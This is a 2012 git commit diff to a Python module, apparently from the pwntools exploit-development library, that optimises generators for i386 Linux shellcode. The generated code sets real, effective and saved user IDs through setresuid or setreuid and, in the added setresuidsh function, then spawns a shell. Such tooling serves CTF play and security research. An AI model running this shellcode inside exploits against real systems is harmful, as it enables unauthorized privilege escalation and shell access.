e26640d88cbc0729a54d5f0bfca1748f480ca519
Mathias Svensson <mathias@diku.dk>
2012-12-27 03:49:42 +0100

    Optimized setresuid

--- pwn/shellcode/misc/setresuid.py
+++ pwn/shellcode/misc/setresuid.py
@@ -1,4 +1,53 @@
 from pwn.internal.shellcode_helper import *
+import ast
+
+@shellcode_reqs(arch='i386', os='linux')
+def setresuidsh(src = 's', dst = 'res'):
+    """Args: [src(imm/reg/r/e/s) = 's'], [dst(r/e/s/combi) = 'res']
+    Sets the real, effective and/or saved UID, then spawns a shell.
+    The source can be either the a number/register or the real, effective or saved UID.
+"""
+    return setresuid(src, dst), sh(False)
+
+@shellcode_reqs(hidden = True, arch='i386', os='linux')
+def _zero_optimized_linux(dst):
+    res = ['setperms:']
+
+    def p(s):
+        res.append(s)
+
+    if 'e' in dst:
+        p('xor ecx, ecx')
+    else:
+        p('push -1')
+        p('pop ecx')
+
+    if 'r' in dst:
+        p('xor ebx, ebx')
+    else:
+        if 'e' not in dst:
+            p('mov ebx, ecx')
+        else:
+            p('push -1')
+            p('pop ebx')
+
+    if 's' not in dst:
+        p('push SYS_setreuid')
+        p('pop eax')
+    else:
+        if 'e' in dst:
+            p('imul ecx')
+            p('mov al, SYS_setresuid')
+        elif 'r' in dst:
+            p('imul ebx')
+            p('mov al, SYS_setresuid')
+        else:
+            p('xor eax, eax')
+            p('cdq')
+            p('mov al, SYS_setresuid')
+
+    p('int 0x80')
+    return ''.join('\n    ' + s for s in res)
 
 @shellcode_reqs(arch='i386', os='linux')
 def setresuid(src = 's', dst = 'res'):
@@ -7,18 +56,31 @@ def setresuid(src = 's', dst = 'res'):
     The source can be either the a number/register or the real, effective or saved UID.
 """
 
+    return _linux_setresuid(src, dst)
 
-    if src == 0 and sorted(set(dst)) == ['e', 'r', 's']:
-        return '''
-setperms:
-    xor ecx, ecx
-    imul ecx
-    xor ebx, ebx
-    mov al, SYS_setreuid
-    int 0x80
-'''
+@shellcode_reqs(hidden = True, arch='i386', os='linux')
+def _linux_setresuid(src, dst):
+    try:
+        src2 = ast.literal_eval(src)
+        if isinstance(src2, int):
+            src = src2
+    except:
+        pass
+
+    dst = ''.join(sorted(set(dst)))
+    if not all(c in 'res' for c in dst):
+        die('Destination for setresuid must be a subset of "res"')
+
+    if src == 0:
+        return _zero_optimized_linux(dst)
 
     lookup = {'r': 'ebx', 'e': 'ecx', 's': 'edx'}
+
+    if 's' in dst:
+        syscall = 'SYS_setresuid'
+    else:
+        syscall = 'SYS_setreuid'
+        del lookup['s']
 
     res = ['setperms:']
 
@@ -44,8 +106,6 @@ setperms:
         p('pop eax')
         p('int 0x80')
         p('pop %s' % lookup[dst[0]])
-    elif src == 0:
-        p('xor %s, %s' % lookup[dst[0]])
     elif isinstance(src, int) and -128 <= src <= 127:
         p('push %s' % src)
         p('pop %s' % lookup[dst[0]])
@@ -65,8 +125,12 @@ setperms:
             else:
                 p('mov %s, %s' % (v, first))
 
-    p('xor eax, eax')
-    p('mov al, SYS_setresuid')
+    if syscall == 'SYS_setreuid':
+        p('push %s' % syscall)
+        p('pop eax')
+    else:
+        p('xor eax, eax')
+        p('mov al, %s' % syscall)
     p('int 0x80')
 
     return ''.join('\n    ' + s for s in res)
